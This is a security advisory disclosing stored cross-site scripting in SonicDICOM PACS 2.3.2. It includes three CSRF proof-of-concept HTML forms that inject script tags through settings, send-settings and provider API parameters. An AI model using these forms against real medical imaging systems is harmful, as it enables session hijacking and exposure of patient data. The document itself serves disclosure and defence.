@@ -1,0 +1,78 @@
+SonicDICOM PACS 2.3.2 Multiple Stored Cross-Site Scripting Vulnerabilities
+
+
+Vendor: JIUN Corporation
+Product web page: https://www.sonicdicom.com
+Affected version: 2.3.2 and 2.3.1
+
+Summary: SonicDICOM is PACS software that combines the capabilities of
+DICOM Server with web browser based DICOM Viewer.
+
+Desc: The application suffers from multiple stored XSS vulnerabilities.
+Input passed to several API POST parameters is not properly sanitised
+before being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+Tested on: Microsoft-HTTPAPI/2.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5394
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5394.php
+
+22.11.2016
+
+--
+
+
+CSRF Stored XSS via value parameter in settings API:
+----------------------------------------------------
+
+<html>
+  <body>
+    <form action="http://172.19.0.214/viewer/api/settings/add" method="POST">
+      <input type="hidden" name="id" value="testingus" />
+      <input type="hidden" name="key" value="viewer&#46;display&#46;overlay&#46;tl" />
+      <input type="hidden" name="value" value="&#123;"angle"&#58;&#123;"item&#95;name"&#58;"Angle"&#44;"display&#95;name"&#58;"&#92;"><script>alert&#40;1&#41;<&#47;script>"&#125;&#125;" />
+      <input type="submit" value="Request #1" />
+    </form>
+  </body>
+</html>
+
+
+CSRF Stored XSS via Name parameter in sendsettings API:
+-------------------------------------------------------
+
+<html>
+  <body>
+    <form action="http://172.19.0.214/viewer/api/sendsettings/create" method="POST">
+      <input type="hidden" name="Name" value=""><script>prompt&#40;2&#41;<&#47;script>" />
+      <input type="hidden" name="IPAddress" value="1&#46;1&#46;1&#46;1" />
+      <input type="hidden" name="Port" value="123" />
+      <input type="hidden" name="CalledAETitle" value="asd" />
+      <input type="hidden" name="CallingAETitle" value="dsa" />
+      <input type="submit" value="Request #2" />
+    </form>
+  </body>
+</html>
+
+
+CSRF Stored XSS via Name parameter in providers API:
+----------------------------------------------------
+
+<html>
+  <body>
+    <form action="http://172.19.0.214/viewer/api/providers/create" method="POST">
+      <input type="hidden" name="Name" value=""><script>confirm&#40;2&#41;<&#47;script>" />
+      <input type="hidden" name="Port" value="123" />
+      <input type="hidden" name="AETitle" value="ZSL" />
+      <input type="hidden" name="AllowAnonymousUsers" value="true" />
+      <input type="hidden" name="IsAnonymous" value="true" />
+      <input type="submit" value="Request #3" />
+    </form>
+  </body>
+</html>
